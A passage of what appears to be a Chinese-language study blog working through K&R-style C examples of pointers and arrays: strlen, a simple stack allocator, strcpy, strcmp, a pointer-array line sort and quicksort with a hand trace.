class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> a=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> b = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c;</span><br><span class=\"line\">\tc = getchar();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> d;</span><br><span class=\"line\">\td = getchar();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t虽然但是,a和b还是不一样的,a占用4个字节,b占用一个字节</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/image-20231021170522910.png\" style=\"zoom:50%;\">\n\n<p>​\t\t虽然但是,a和b还是不一样的,a占用4个字节,b占用一个字节<br>​\t\t</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/image-20231021170817470.png\" style=\"zoom: 50%;\">\n\n\n\n\n\n<p>strlen    <font color=\"red\">注意, 参数处的 *s  和 for循环里的 *s 是两个含义,  一个是代表定义指针, 一个是取指针指向的地址的值,差了两层</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">strlen</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (n=<span class=\"number\">0</span>; *s!=<span class=\"string\">&#x27;\\0&#x27;</span>; s++)</span><br><span class=\"line\">        n++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>版本2, 数组的尾元素+1 (结束\\0) 减头元素就是长度,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">strlen</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p = s;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*p != <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">        p++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p-s;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"理解地址算数运算-一个简单的存储分配程序\"><a href=\"#理解地址算数运算-一个简单的存储分配程序\" class=\"headerlink\" title=\"理解地址算数运算: 一个简单的存储分配程序\"></a>理解地址算数运算: 一个简单的存储分配程序</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ALLOCSIZE 10000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span> allocbuf[ALLOCSIZE];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span> *allocp = allocbuf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">alloc</span><span class=\"params\">(<span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allocbuf + ALLOCSIZE - allocp &gt;= n)&#123; <span class=\"comment\">//有足够的空闲空间</span></span><br><span class=\"line\">        allocp += n;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> allocp - n; <span class=\"comment\">//分配前的指针p</span></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">afree</span><span class=\"params\">(<span class=\"type\">char</span> *p)</span> <span class=\"comment\">//释放p指向的存储区</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p &gt;= allocbuf &amp;&amp; p &lt; allocbuf + ALLOCSIZE)</span><br><span class=\"line\">        allocp = p;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *data1,*data2;</span><br><span class=\"line\">    <span class=\"type\">int</span> a;</span><br><span class=\"line\">    <span class=\"type\">char</span> src[<span class=\"number\">50</span>] = <span class=\"string\">&quot;hello wolrd&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> src2[<span class=\"number\">50</span>] = <span class=\"string\">&quot;this is the second mem region&quot;</span>;</span><br><span class=\"line\">    data1 = alloc(<span class=\"number\">100</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(data1,src,<span class=\"built_in\">strlen</span>(src)+<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    data2 = alloc(<span class=\"number\">200</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(data2,src2,<span class=\"built_in\">strlen</span>(src2)+<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    a= <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"strcpy的实现\"><a href=\"#strcpy的实现\" class=\"headerlink\" title=\"strcpy的实现\"></a>strcpy的实现</h2><p>实现把指针t指向的字符串复制到指针s指向的位置, 但是不能用s&#x3D;t,因为这个只是拷贝了指针,并没有复制字符串,</p>\n<p>数组方法实现:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span> *s, <span class=\"type\">char</span> *t)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((s[i] = t[i]) != <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>指针方法实现:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span> *s, <span class=\"type\">char</span> *t)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((*s = *t) != <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        s++;</span><br><span class=\"line\">        t++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>经验丰富的程序员更喜欢编写成一下形式:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span> *s,<span class=\"type\">char</span> *t)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((*s++ = *t++) != <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">        ;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还可以进一步缩写,因为和0比较是多余的,while循环的条件本身就需要非0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span> *s,<span class=\"type\">char</span> *t)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (*s++ = *t++)</span><br><span class=\"line\">        ;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"strcmp的实现\"><a href=\"#strcmp的实现\" class=\"headerlink\" title=\"strcmp的实现\"></a>strcmp的实现</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">strcmp</span><span class=\"params\">(<span class=\"type\">char</span> *s,<span class=\"type\">char</span> *t)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;s[i] == t[i];i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s[i] == <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s[i] - t[i];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用指针来实现</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">strcmp</span><span class=\"params\">(<span class=\"type\">char</span> *s,<span class=\"type\">char</span> *t)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(;*s == *t;s++,t++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (*s == <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> *s - *t;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"指针数组排序\"><a href=\"#指针数组排序\" class=\"headerlink\" title=\"指针数组排序\"></a>指针数组排序</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXLINES 5000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *lineptr[MAXLINES];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">readlines</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> nlines)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">writelines</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> nlines)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> nlines;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((nlines = readlines(lineptr,MAXLINES)) &gt;=<span class=\"number\">0</span> )&#123;</span><br><span class=\"line\">        qsort(lineptr,<span class=\"number\">0</span>,nlines<span class=\"number\">-1</span>);</span><br><span class=\"line\">        writelines(lineptr,nlines);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;error: input too big to sort\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXLEN 1000</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline</span><span class=\"params\">(<span class=\"type\">char</span> *,<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">alloc</span><span class=\"params\">(<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">readline</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> maxlines)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> len, nlines;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p,line[MAXLEN];</span><br><span class=\"line\">    nlines = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((len = getline(line,MAXLEN)) &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nlines &gt; maxlines || (p = alloc(len)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            line[len<span class=\"number\">-1</span>] = <span class=\"string\">&#x27;\\0&#x27;</span>;<span class=\"comment\">//删除换行符</span></span><br><span class=\"line\">            <span class=\"built_in\">strcpy</span>(p,line);</span><br><span class=\"line\">            lineptr[nlines++] = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nlines;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">writelines</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> nlines)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i&lt;nlines;i++)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,lineptr[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">qsort</span><span class=\"params\">(<span class=\"type\">char</span> *v[], <span class=\"type\">int</span> left,<span class=\"type\">int</span> right)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i,last;</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">char</span> *v[],<span class=\"type\">int</span> i, <span class=\"type\">int</span> j)</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (left &gt;= right)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    swap(v,left,(left+right)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    last = left;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = left+<span class=\"number\">1</span>; i&lt;= right; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(v[i],v[left]) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">            swap(v,++last,i);</span><br><span class=\"line\">    swap(v,left,last);</span><br><span class=\"line\">    qsort(v,left,last<span class=\"number\">-1</span>);</span><br><span class=\"line\">    qsort(v,last+<span class=\"number\">1</span>,right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">char</span> *v[],<span class=\"type\">int</span> i,<span class=\"type\">int</span> j)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *temp;</span><br><span class=\"line\">    temp = v[i];</span><br><span class=\"line\">    v[i] = v[j];</span><br><span class=\"line\">    v[j] = temp;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"基础快速排序\"><a href=\"#基础快速排序\" class=\"headerlink\" title=\"基础快速排序\"></a>基础快速排序</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">int</span> v[],<span class=\"type\">int</span> i,<span class=\"type\">int</span> j)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">qsort</span><span class=\"params\">(<span class=\"type\">int</span> v[],<span class=\"type\">int</span> left,<span class=\"type\">int</span> right)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"type\">int</span> v[<span class=\"number\">11</span>] = &#123;<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span>&#125;;</span><br><span class=\"line\">    qsort(v,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">11</span>;i++)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d,&quot;</span>,v[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">int</span> v[],<span class=\"type\">int</span> i,<span class=\"type\">int</span> j)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> temp;</span><br><span class=\"line\">    </span><br><span class=\"line\">    temp = v[i];</span><br><span class=\"line\">    v[i] = v[j];</span><br><span class=\"line\">    v[j] = temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 3,2,9,2,3,7,8,1,6,8,4</span></span><br><span class=\"line\"><span class=\"comment\">// 以递增顺序对v[left]到v[right]进行排序</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">qsort</span><span class=\"params\">(<span class=\"type\">int</span> v[],<span class=\"type\">int</span> left,<span class=\"type\">int</span> right)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i,last;</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">int</span> v[],<span class=\"type\">int</span> i,<span class=\"type\">int</span> j)</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (left &gt;= right) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    swap(v,left, (left+right)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    last = left;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = left+<span class=\"number\">1</span>;i&lt;=right;i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (v[i] &lt; v[left])</span><br><span class=\"line\">            swap(v,++last,i);</span><br><span class=\"line\">    swap(v,left,last);</span><br><span class=\"line\">    <span class=\"comment\">//qsort(v, left, last-1);</span></span><br><span class=\"line\">    <span class=\"comment\">//qsort(v,last+1,right);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">举例</span><br><span class=\"line\">\t<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span></span><br><span class=\"line\">    qsort(v,<span class=\"number\">0</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\">第一次排序后</span><br><span class=\"line\">    <span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span></span><br><span class=\"line\">第一次把中间的<span class=\"number\">7</span>放到开头,然后对比,依次把小于它的往前放,放到last+<span class=\"number\">1</span>的位置</span><br><span class=\"line\">    <span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">9</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">9</span>,<span class=\"number\">3</span>,<span class=\"number\">8</span>,<span 